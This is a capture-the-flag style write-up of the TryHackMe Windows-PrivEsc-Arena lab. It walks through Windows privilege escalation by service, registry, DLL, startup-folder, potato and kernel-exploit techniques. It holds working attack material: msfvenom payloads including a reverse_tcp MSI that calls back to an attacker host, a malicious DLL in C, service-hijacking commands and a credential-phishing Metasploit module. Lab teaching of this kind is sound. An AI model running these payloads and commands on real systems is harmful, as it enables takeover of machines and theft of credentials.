# Windows-PrivEsc-Arena TryHackMe Writeup

This room teaches a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more.

**Room Scope:**
* Service Escalation — Unquoted Service Paths
* Service Escalation — DLL Hijacking
* Service Escalation — Registry
* Service Escalation — Executable Files
* Service Escalation — binPath
* Potato Escalation — Hot Potato
* Registry Escalation — Autorun
* Registry Escalation — AlwaysInstallElevated
* Privilege Escalation — Startup Applications
* Password Mining Escalation — Memory
* Privilege Escalation — Kernel Exploits

**Initial Access:**
Connect via RDP:
`rdesktop 10.10.14.235 -u user -p password321`

---

## 1. Service Escalation — Unquoted Service Paths

**Concept:**
If a service path contains spaces and is not wrapped in quotes (e.g., `C:\Program Files\example 2\app.exe`), Windows interprets it ambiguously. It attempts to execute files in the following order:
1.  `C:\Program.exe`
2.  `C:\Program Files\example.exe`
3.  `C:\Program Files\example 2\app.exe`

If we have write access to `C:\Program Files\`, we can plant a malicious `example.exe`. When the service restarts, it will execute our file instead of the intended application.

**Exploitation:**
1.  **List services with potential unquoted paths:**
    ```powershell
    Get-WmiObject win32_service | Select-Object Name, State, PathName
    ```
    
![[1_s9-bNEaXIshD59MtFrxR6g.webp]]
1.  **Query specific service configuration:**
    ```cmd
    sc qc unqoutedsvc
    ```
    ![[Pasted image 20260103025410.png]]
    *The `BINARY_PATH_NAME` is unquoted.*

2.  **Check permissions:**
    Use `accesschk64.exe` to see if we can write to the directory.
    ![[Pasted image 20260103025439.png]]

3.  **Generate Payload:**
    Since the path breaks at spaces, we can name our payload `common.exe` (to interrupt `C:\Program Files\Unquoted path service\common.exe`).
    ```bash
    msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
    ```
    *Note: Using `windows/exec` to add a user is often more stable than a reverse shell for service exploits, as services may timeout if they don't respond quickly.*

4.  **Deploy and Restart:**
    Move `common.exe` to the target folder and restart the service.
![[Pasted image 20260103025453.png]]
    ![[Pasted image 20260103025618.png]]

---

## 2. Service Escalation — DLL Hijacking

**Concept:**
DLL Hijacking abuses how Windows applications search for Dynamic Link Libraries (DLLs). If a program tries to load a DLL that doesn't exist, it searches specific paths (like the application directory or system path). If we have write access to one of these paths, we can plant a malicious DLL.

**Tools:**
* **Process Monitor (ProcMon):** Used to identify "NAME NOT FOUND" errors when a process tries to load a DLL.
![[1_ZXPOdh8j_pkGlD6F2mdUNQ.webp]]
**Exploitation:**
1.  **Analyze the Process:**
    Filter ProcMon for the target process (`dllhijackservice.exe`) and look for failed DLL loads.
    ![[1_EEPH9LT3kDtZfu9vv-TaJQ.webp]]
    ![[1_UPWh9lbt0J-GTyDdlYcOJA.webp]]
2.  **Identify Vulnerable Path:**
    The process tries to load a DLL from `C:\Temp`, a directory we can write to.
    ![[1_g3yn8a8Kon6fEcQBRv_u2g.webp]]

3.  **Craft Malicious DLL (C Code):**
    ```c
    #include <windows.h>
    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k net localgroup administrators user /add");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

4.  **Compile:**
    ```bash
    x86_64-w64-mingw32-gcc dll.c -shared -o hijackme.dll
    ```

5.  **Deploy:**
    Place `hijackme.dll` in `C:\Temp` and restart the service.
    
![[Pasted image 20260103025928.png]]

---

## 3. Service Escalation — Registry

**Concept:**
Services have entries in the Windows Registry (specifically under `HKLM\SYSTEM\CurrentControlSet\Services`). If permissions are weak, an attacker can modify the `ImagePath` key to point to a malicious executable.

**Exploitation:**
1.  **Enumerate Registry Permissions:**
    Search for services where `NT AUTHORITY\INTERACTIVE` has `FullControl`.
    ```powershell
    Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\regsvc | fl
    ```
    ![[1_NF0-0S6vKn1TS3hYy_pPVg.webp]]

2.  **Create Payload:**
    Use the C-based wrapper found in the room resources or MSFVenom to create an executable (e.g., `fake.exe`).
    ```bash
    i686-w64-mingw32-gcc windows_service.c -o fake.exe
    ```

3.  **Modify Registry:**
    Overwrite the `ImagePath` to point to your payload.
    ```cmd
    reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\fake.exe /f
    ```
    

4.  **Execute:**
    Start the service to run the payload.
    ![[Pasted image 20260103030102.png]]

---

## 4. Service Escalation — Executable Files

**Concept:**
If the actual `.exe` file of a service has weak file permissions (e.g., "Everyone" can Write), we can simply replace the legitimate binary with our malicious one.

**Exploitation:**
1.  **Find Vulnerable Services:**
    Tools like `PowerUp.ps1` or manual enumeration using `accesschk` and `sc.exe` work well.
    ```powershell
    Get-Service | Where-Object {$_.Status -eq "Running"}
    ```
    ```cmd
    sc.exe query type=service
    ```
    ![[Pasted image 20260103030134.png]]

2.  **Check File Permissions:**
    ![[1_I1I87BGBDFfgMSV_nuqebw.webp]]
    

3.  **Replace and Restart:**
    Backup the original file, copy your malicious payload (e.g., a reverse shell) to overwrite the service executable, and restart the service.
    
    ![[1_3HV8Npco9eJC-SrNHidItA.webp]]
![[Pasted image 20260103030224.png]]
---

## 5. Service Escalation — binPath

**Concept:**
Similar to Registry escalation, but instead of modifying the registry key manually, we use the `sc config` command to change the `binPath` (Binary Path) of the service configuration itself. This requires the `SERVICE_CHANGE_CONFIG` permission.

**Exploitation:**
1.  **Check Permissions:**
    ```cmd
    .\accesschk64.exe -wuvc Everyone *
    ```
    
![[1_w5NlfZbkV_VI8a6_iGHB3w.webp]]
1.  **Modify Configuration:**
    Change the binary path to execute a command (like adding a user).
    ```cmd
    sc config daclsvc binpath= "net localgroup administrators user /add"
    ```
    ![[1_9hkBjS5jO9hdKY7ABr2TFA.webp]]

2.  **Execute:**
    Start the service. It will fail to start (because net.exe is not a service), but the command will execute successfully.
    
![[1_ZUT3rfiSNVade1RH_ViRcQ.webp]]

---

## 6. Potato Escalation — Hot Potato

**Concept:**
Hot Potato allows privilege escalation from a Service Account (like `LocalService` or `NetworkService`) to `SYSTEM` by spoofing WPAD (Web Proxy Auto-Discovery) and forcing NTLM authentication over HTTP.
* **Target:** Windows 7 is commonly vulnerable.
* **Mitigation:** Patched in MS16–075.

**Exploitation:**
1.  **Check Patch Level:**
    ```cmd
    wmic qfe list full /format:table
    ```
2.  **Run Tater (PowerShell implementation):**
    ```powershell
    . .\tater.ps1
    Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
    ```
    ![[1_PTDSJXC8KTwRfkWEkB2Wtg.webp]]

---

## 7. Registry Escalation — Autorun

**Concept:**
Autorun programs start automatically when a user logs in. If an executable listed in the Autorun registry keys is writable, we can replace it. When an Admin logs in, our code runs with their privileges.

**Exploitation:**
1.  **Enumerate Autoruns:**
    Use `Autoruns64.exe` to inspect entries.
    
![[1_FHr06UEhp1F6uQgLGTlwKA.webp]]
1.  **Check Permissions:**
    Found `program.exe` in `C:\Program Files\Autorun Program\`.
    ![[Pasted image 20260103030856.png]]

2.  **Replace Binary:**
    Generate a payload with `msfvenom`, download it to the target, and overwrite `program.exe`.
    
![[1_eIZAaQ1sP-i_X6-x5eqm4Q.webp]]
2.  **Trigger:**
    Log out and log back in as an Administrator (simulated in the lab via RDP).
    
    
![[1_Qcv5ZUKMQQCj2xvP-JrGYw.webp]]
![[Pasted image 20260103030935.png]]

---

## 8. Registry Escalation — AlwaysInstallElevated

**Concept:**
A registry setting that allows non-privileged users to run Microsoft Installer (MSI) files with elevated (SYSTEM) privileges.

**Exploitation:**
1.  **Check Status:**
    Both keys must be set to `0x1`.
    ```cmd
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer
    reg query HKCU\Software\Policies\Microsoft\Windows\Installer
    ```

2.  **Generate MSI Payload:**
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=7878 -f msi -o setup.msi
    ```

3.  **Execute:**
    Run the installer on the target.
    
    ![[1_WqD5j9BNqa6j35GJ_8R3EA.webp]]
![[1_KByEkzZdABLJnibtI_bEZQ.webp]]
---

## 9. Privilege Escalation — Startup Applications

**Concept:**
Similar to Autoruns, but relies on the Startup folder in the Start Menu. If we can write to `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`, any executable placed there will run when any user logs in.

**Exploitation:**
1.  **Check Folder Permissions:**
    ```cmd
    icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    ```
    *Look for `BUILTIN\Users:(F)` or `(W)`.*

2.  **Plant Payload:**
    Copy your malicious exe to the folder.
    
![[1_cqTSWLDqf_vBVprO7dp3Rg.webp]]
2.  **Trigger:**
    Wait for an administrator to log in.
    ![[1_MXJzrXkmPZ7SkMUxTuxNEQ.webp]]

---

## 10. Password Mining Escalation — Memory

**Concept:**
Users sometimes leave credentials in memory or applications behave insecurely. This section specifically covers using Metasploit to prompt a user for credentials (phishing via local access).

**Exploitation:**
1.  **Launch Capture Module:**
    ```bash
    msfconsole -x "use auxiliary/server/capture/http_basic;set uripath x ; run"
    ```
    This sets up a listener that requests HTTP Basic Auth.

2.  **Trigger:**
    If the victim browses to your listener (or a script forces them to), they get a credential prompt.
    ![[1_rGbTEwu90NHv2mMUy1ptnw.webp]]

3.  **Capture:**
    Credentials entered are sent to the MSF console.
    
![[1_1Wt4j0GIBwG6iWkZgsFkcQ.webp]]


---

## 11. Privilege Escalation — Kernel Exploits

**Concept:**
Exploiting vulnerabilities in the Windows Kernel itself (e.g., EternalBlue, Token Stealing exploits) to jump directly to SYSTEM. Common on older OS versions (XP, Win 7, Win 8).

**Detection:**
1.  **Windows Exploit Suggester:**
    Get `systeminfo` output and run it against the database.
    ```bash
    python windows-exploit-suggester.py --database 2022-04-25-mssb.xls --systeminfo sysinfo.txt
    ```

2.  **Metasploit:**
    Use `post/multi/recon/local_exploit_suggester` on an active session.

![[1_eRLxHOMgAAoDXVNwYjY_yw.webp]]

![[Pasted image 20260103031409.png]]

---

## Automation Tools
Manual checks are good for learning, but tools speed up the process.
* **PowerUp.ps1:** Checks for many of the vectors above (Services, Registry, etc.).
* **WinPEAS:** The ultimate enumeration script for Windows.